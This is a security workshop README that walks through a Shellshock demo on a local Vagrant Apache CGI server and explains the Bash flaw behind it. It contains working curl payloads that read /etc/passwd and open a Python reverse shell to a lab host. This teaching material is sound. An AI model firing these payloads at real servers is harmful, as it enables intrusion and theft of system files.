# Part 2 of the AppSec 101 injection workshop
### Created by Cade Cairns <cade@thoughtworks.com> and Chelsea Komlo <ckomlo@thoughtworks.com>

# Getting started on the Shellshock demo for this workshop

All necessary instruction & demo materials can be found within the shellshock subfolder
  
## Setup
   1. Set up a vagrant box using this vagrant file. This will install Apache and forward to port 8080.
   2. Create a cgi file in /usr/lib/cgi-bin. It can be as simple as html content type "hello world."
   3. Test the following vulnerabilities against http://localhost:8080/cgi-bin/somefileofyourchoice.sh


## Demoing the vulnerability
### To test via the command line:

```sh
env x='() { :;}; echo vulnerable' bash -c "echo this is a test"
```
(If you see "vulnerable" you need to update bash. Otherwise, you should be good to go.)


#### Via curl:

#### To just echo data:

```sh
curl -H "Useragent: () { :; }; echo \"Content-type: text/plain\"; echo; echo; echo 'hi world of exploits'" http://localhost:8080/cgi-bin/shellshock_test.sh
```

#### To copy passwords:
```sh
curl -H "Useragent: () { :; }; echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" http://localhost:8080/cgi-bin/shellshock_test.sh
 ```

#### To create a reverse shell:
 ```sh
curl -H "UserAgent: () { :; }; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.2.2\",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno    (),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" http://localhost:8080/cgi-bin/shellshock_test.sh
 ```


## More information about Shellshock:
 Source: https://en.wikipedia.org/wiki/Shell_shock

This is a major vulnerability that occurs when specific characters are included as part of a variable definition in Bash.

Function definitions are exported by encoding them within the environment variable list as variables whose values begin with parentheses ("()") followed by a function definition.

If the characters "{ :;};" are included as the function definition, any arbitrary code that is inserted AFTER that definition is processed. This isn't supposed to happen.

### Why is CGI vulnurable?

The Common Gateway Interface (CGI) vector (an interface between a web server and executables that produce dynamic content) has received the bulk of the focus from attackers thus far. However, the reac    h of the BASH Shellshock bug doesn’t stop at web servers. Any application that relies on user-controlled data to set OS-level environment variables and then invokes the shell from that same context can trigger the vulnerability. In other words, web applications relying on a specific type of user input can be manipulated to make clients (i.e., consumers) vulnerable to attack.
 
 Because CGI relies on environment variables set in the header which are later interpreted to generate dynamic content, it is vulnerable to this kind of attack.

